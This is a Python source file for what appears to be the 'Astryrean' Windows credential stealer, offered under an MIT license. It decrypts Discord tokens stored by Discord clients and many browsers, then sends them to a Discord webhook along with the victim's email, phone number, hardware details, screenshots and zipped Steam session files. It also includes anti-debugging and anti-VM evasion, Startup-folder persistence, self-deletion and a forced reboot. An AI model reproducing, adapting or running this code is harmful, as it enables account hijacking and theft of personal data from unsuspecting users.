"""
MIT License

Copyright (c) 2025 ᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import requests
import socket
import psutil
import string
import zipfile
import platform
import subprocess
import json
import shutil
import re
import base64
import random
import win32crypt
import re
import wmi
import os
import pyautogui
import tempfile
import sys
from Crypto.Cipher import AES

h00k = ""

os_platform = platform.system()

if os_platform == "Windows":
    print (" ")
elif os_platform in ["Darwin", "Linux"]:
    print(f"ERROR")
    exit(1)
else:
    print(f"ERROR")
    exit(1)

def machineinfo():
    c = wmi.WMI()
    GPUm = "Unknown"
    for gpu in c.Win32_VideoController():
        GPUm = gpu.Description.strip()
    
    mem = psutil.virtual_memory()

    def machine_hwid():
        command = 'powershell "Get-CimInstance -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
        hwid = subprocess.check_output(command, shell=True, text=True).strip()
        return hwid
    
    current_machine_id = machine_hwid()

    total_gb = round(mem.total / 1024**3)
    cpu = platform.processor()
    os_name = platform.platform()
    pc_name = platform.node()

    user_name = platform.uname().node  #
    host_name = socket.gethostname()  
    disk_usage = psutil.disk_usage('/').percent  
    free_space = round(psutil.disk_usage('/').free / (1024**3), 2)  

    data2 = {
        "username": "Astryrean", 
        "avatar_url": "https://i.imgur.com/n5NcLFl.jpeg",  
        "embeds": [
            {
                "title": "<:cpu:1363299069040132157> Machine Info",
                "fields": [
                    {
                        "name": "<:cpu:1363299069040132157> SYSTEM",
                        "value": f"```CPU: {cpu}\nGPU: {GPUm}\nOS: {os_name}\nRAM: {total_gb}GB\nHwid: {current_machine_id}```",
                        "inline": False
                    },
                    {
                        "name": "<:user:1363299069040132157> USER",
                        "value": f"```User: {user_name}\nHost Name: {host_name}```", 
                        "inline": False
                    },
                    {
                        "name": "<:disk:1363299069040132157> DISK",
                        "value": f"```Disk Usage: {disk_usage}%\nFree Space: {free_space}GB```",  
                        "inline": False
                    },
                    {
                        "name": "<:wifi:1363299069040132157> WIFI",
                        "value": f"```Wi-Fi Status: ? \nSSID: ?```",  
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "zakocord. | github.com/zakocord/Astryrean/"
                }
            }
        ]
    }

    response2 = requests.post(h00k, json=data2)

def gen_filename(length=5):
    safe_chars = string.ascii_letters + string.digits + "_-"
    return ''.join(random.choice(safe_chars) for _ in range(length))

def screenshot():
    temp_dir = tempfile.gettempdir()
    screenshot_filename = gen_filename(16) + ".png" 
    screenshot_path = os.path.join(temp_dir, screenshot_filename)

    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)

    with open(screenshot_path, "rb") as f:
        files = {"file": (screenshot_filename, f, "image/png")}
        data = {
            "username": "Astryrean", 
            "content": f"Screenshots | github.com/zakocord/Astryrean",
            "avatar_url": "https://i.imgur.com/n5NcLFl.jpeg",  
        }
        response3 = requests.post(h00k, data=data, files=files)
    
    if response3.status_code == 204:
        pass
    else:
        pass

L = os.getenv("LOCALAPPDATA")
R = os.getenv("APPDATA")
user_name = os.getlogin()
host_name = platform.node()
display_name = os.environ.get('USERPROFILE', 'Unknown User')

api = "https://discord.com/api/v10/users/@me"

PATHS = {
    'Discord': R + '\\discord',
    'Discord Canary': R + '\\discordcanary',
    'Lightcord': R + '\\Lightcord',
    'Discord PTB': R + '\\discordptb',
    'Opera': R + '\\Opera Software\\Opera Stable',
    'Opera GX': R + '\\Opera Software\\Opera GX Stable',
    'Amigo': L + '\\Amigo\\User Data',
    'Torch': L + '\\Torch\\User Data',
    'Kometa': L + '\\Kometa\\User Data',
    'Orbitum': L + '\\Orbitum\\User Data',
    'CentBrowser': L + '\\CentBrowser\\User Data',
    '7Star': L + '\\7Star\\7Star\\User Data',
    'Sputnik': L + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': L + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': L + '\\Google\\Chrome SxS\\User Data',
    'Chrome': L + "\\Google\\Chrome\\User Data\\Default",
    'Epic Privacy Browser': L + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': L + '\\Microsoft\\Edge\\User Data\\Default',
    'Uran': L + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': L + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': L + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': L + '\\Iridium\\User Data\\Default'
}

def get_master_key(path: str):
    local_state_path = os.path.join(path, "Local State")
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        return None

def decrypt_value(encrypted_value: bytes, master_key: bytes) -> str:
    try:
        if encrypted_value[:3] == b"v10":
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt_and_verify(payload, tag)
            return decrypted.decode()
    except Exception:
        pass
    return ""

def tokens(token: str):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36'
    }
    
    try:
        user_get = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
        
        if user_get.status_code == 200:
            print(".")

            BADGES = {
    1: "<:8485discordemployee:1163172252989259898>",  # Discord Employee
    2: "<:9928discordpartnerbadge:1163172304155586570>",  # Partnered Server Owner
    4: "<:9171hypesquadevents:1163172248140660839>",  # HypeSquad Events
    8: "<:4744bughunterbadgediscord:1163172239970140383>",  # Bug Hunter Level 1
    64: "<:6601hypesquadbravery:1163172246492287017>",  # House Bravery
    128: "<:6936hypesquadbrilliance:1163172244474822746>",  # House Brilliance
    256: "<:5242hypesquadbalance:1163172243417858128>",  # House Balance
    512: "<:5053earlysupporter:1163172241996005416>",  # Early Supporter
    16384: "<:1757bugbusterbadgediscord:1163172238942543892>",  # Bug Hunter Level 2
    131072: "<:1207iconearlybotdeveloper:1163172236807639143>",  # Early Verified Bot Developer
    262144: "<:4149blurplecertifiedmoderator:1163172255489085481>",  # Certified Moderator
    4194304: "<:1207iconactivedeveloper:1163172534443851868>",  # Active Developer
}

            user = user_get.json()

            user_id = user.get("id")
            user_name = user.get("username")
            email = user.get("email", "None")
            phone = user.get("phone", "None")
            guild_tag = user.get("primary_guild", {}).get("tag", "None")
            public_flags = user.get("public_flags", 0)
            avatar_hash = user.get("avatar")
            user_badges = [name for bit, name in BADGES.items() if public_flags & bit]
            mfa = user.get('mfa_enabled', False)

            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png" if avatar_hash else None

            premium_type = user.get("premium_type", 0)
            nitro_type = "<:diamond:1363072286319710208> None"
            if premium_type == 1:
                 nitro_type = "<:emo:1363064691282149418> Nitro Classic"
            elif premium_type == 2:
                nitro_type = "<:nitro_booster:1363009541515513986> Nitro Boost"
            elif premium_type == 3:
                nitro_type = "<:emo:1363064691282149418> Basic Nitro"
            




            embed = {
                "username": "Astryrean",
                "avatar_url": "https://i.imgur.com/n5NcLFl.jpeg",
                "embeds": [{
                    "title": f"{user_name} | ({user_id})",
                    "fields": [
                        {
                            "name": "<:token:1363009168830631997> Token",
                            "value": f"```{token}```\n[Click to Copy](https://zakocord.github.io/copy/?p={token})",
                            "inline": False
                        },
                        {
                            "name": "<:diamond:1363072286319710208> Badge",
                            "value": f"-# {', '.join(user_badges) if user_badges else 'None'}",
                            "inline": True
                        },
                        {
                            "name": "<:mfa:1363379835946270750> MFA",
                            "value": f"{mfa}",
                            "inline": True
                        },
                        {
                            "name": "<:nitro_booster:1363009541515513986> Nitro",
                            "value": nitro_type,
                            "inline": True
                        },
                        {
                            "name": "<:tag:1363410448073887885> GUILD TAG",
                            "value": f"{guild_tag}",
                            "inline": True,
                        },
                        {
                            "name": "<:mail:1363060331131310261> Email",
                            "value": f"```{email}```",
                            "inline": False
                        },
                        {
                            "name": "<:phone:1363060332972740688> Phone",
                            "value": f"```{phone}```",
                            "inline": False
                        }
                    ],
                    "footer": {
                        "text": "zakocord. | github.com/zakocord/Astryrean/"
                    },
                    "thumbnail": {
                        "url": avatar_url
                    }
                }]
            }

            headers = {
                "Content-Type": "application/json"
            }

            response = requests.post(h00k, data=json.dumps(embed), headers=headers)
            
    except Exception as e:
        print(f"{e}")

def find_token():
    found_tokens = set()

    for app, path in PATHS.items():
        local_storage_path = os.path.join(path, "Local Storage", "leveldb")
        if not os.path.exists(local_storage_path):
            continue

        master_key = get_master_key(path)
        if master_key is None:
            continue

        for file in os.listdir(local_storage_path):
            if not file.endswith(".ldb") and not file.endswith(".log"):
                continue

            try:
                with open(os.path.join(local_storage_path, file), "r", errors="ignore") as f:
                    for line in f:
                        matches = re.findall(r'dQw4w9WgXcQ:([a-zA-Z0-9+/=]+)', line)
                        for match in matches:
                            try:
                                encrypted_token = base64.b64decode(match)
                                decrypted_token = decrypt_value(encrypted_token, master_key)
                                if decrypted_token:
                                    found_tokens.add(decrypted_token.strip())
                            except Exception:
                                continue
            except PermissionError:
                continue

    valid_tokens = [token for token in found_tokens if valid_token(token)]

    for token in valid_tokens:
        tokens(token)  

def valid_token(token: str) -> bool:
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100'
    }
    try:
        response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        return response.status_code == 200
    except requests.RequestException:
        return False
    
def anti_debugger():
    blacklist_Process = [
        "x64dbg.exe", "x32dbg.exe", "windbg.exe", "ollydbg.exe", "ida.exe", "idag.exe", "idaw.exe",
        "ida64.exe", "idag64.exe", "idaw64.exe", "idau.exe", "idau64.exe",
        "gdb.exe", "dbgview.exe",
        "processhacker.exe", "procmon.exe", "procexp.exe", "tcpview.exe", "wireshark.exe",
        "dumpcap.exe", "fiddler.exe", "apimonitor.exe", "resourcehacker.exe",
        "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
        "vmsrvc.exe", "vmusrvc.exe", "qemu-ga.exe", "prl_tools.exe",
        "cheatengine.exe", "scylla.exe", "scylla_x64.exe", "scylla_x86.exe", "xspy.exe",
        "megadumper.exe", "lordpe.exe", "pe-bear.exe",
        "devenv.exe", "code.exe", "pycharm.exe", "eclipse.exe", "idea64.exe"
    ]

    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() in [p.lower() for p in blacklist_Process]:
                sys.exit(1)
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

def is_virtual_machine_windows():
    try:
        command = [
            "powershell",
            "-Command",
            "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Model"
        ]
        output = subprocess.check_output(command, stderr=subprocess.DEVNULL).decode().strip().lower()

        vm_keywords = ["virtual", "vmware", "virtualbox", "kvm", "xen", "qemu", "hyper-v", "parallels"]
        for keyword in vm_keywords:
            if keyword in output:
                pass
                return True
    except Exception as e:
        pass
    return False

def checker():
    is_vm = False


    hostname = socket.gethostname()
    if hostname.lower() == "apponfly-vps":
        pass
        is_vm = True


    if is_virtual_machine_windows():
        is_vm = True

    suspicious_processes = ["vmtoolsd.exe", "vboxservice.exe"]
    try:
        tasks = os.popen("tasklist").read().lower()
        for proc in suspicious_processes:
            if proc in tasks:
                pass
                is_vm = True
    except Exception as e:
        pass

    if is_vm:
        data_VM = {
            "username": "Astryrean | VM Detection",
            "content": f"# @everyone \n ⚠️WARN⚠️ \n We've detected activity attempting to attack or debug your webhook. This webhook has been removed.",
            "avatar_url": "https://i.imgur.com/n5NcLFl.jpeg",
        }

        try:
            requests.post(h00k, json=data_VM)
            requests.delete(h00k)
        except Exception as e:
            pass
        sys.exit(1)

def startup():
    my = sys.executable
    startupfolder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    path = os.path.join(startupfolder, os.path.basename(my))

    if my != path and not os.path.exists(path):
        shutil.copy2(my, path)

def restart():
    os.system("shutdown /r /t 0")

def delete():
    self_path = os.path.abspath(sys.argv[0])
    subprocess.Popen([
        sys.executable,
        "-c",
        f"import os, time; time.sleep(1); os.remove(r'{self_path}')"             
    ])
    sys.exit()

def steam():
    os.system("taskkill /F /IM Steam.exe")
    os.system("cls")
    steam_path = os.environ.get("PROGRAMFILES(X86)", "") + "\\Steam"
    if os.path.exists(steam_path):
        ssfn_files = [os.path.join(steam_path, file) for file in os.listdir(steam_path) if file.startswith("ssfn")]
        steam_config_path = os.path.join(steam_path, "config")

        zip_path = os.path.join(os.environ['TEMP'], "session_steam.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zp:
            if os.path.exists(steam_config_path):
                for root, dirs, files in os.walk(steam_config_path):
                    for file in files:
                        zp.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), steam_path))
                for ssfn_file in ssfn_files:
                    zp.write(ssfn_file, os.path.basename(ssfn_file))

        embed = {
        "username": "Astryrean", 
        "avatar_url": "https://i.imgur.com/n5NcLFl.jpeg",  
            "embeds": [
                {
                    "title": "<:steam:1368887299860987944> Steam",
                    "description": "```✅️ Found The Steam Session```",
                }
            ]
        }

        response = requests.post(h00k, json=embed)
        if response.status_code != 204:
            pass 

        with open(zip_path, 'rb') as f:
            files = {'file': ('steam_session.zip', f)}
            response = requests.post(h00k, files=files)
            if response.status_code != 204:
                pass  

        os.remove(zip_path)

def main():
    feature = {
        "anti_vm": False,
        "anti_debug": False,
        "token": False,
        "systeminfo": False,
        "screenshot": False,
        "startup": False,
        "restart": False,
        "self_delete": False,
        "Launcher": False
    }
    if feature.get("token", False):
        find_token()
    if feature.get("systeminfo", False):
        machineinfo()
    if feature.get("screenshot", False):
        screenshot() 
    if feature.get("anti_debug", False):
        anti_debugger() 
    if feature.get("anti_vm", False):
        checker() 
    if feature.get("startup", False):
        startup()
    if feature.get("restart", False):
        restart()
    if feature.get("self_delete", False):
        delete()
    if feature.get("Launcher", False):
        steam()
main()
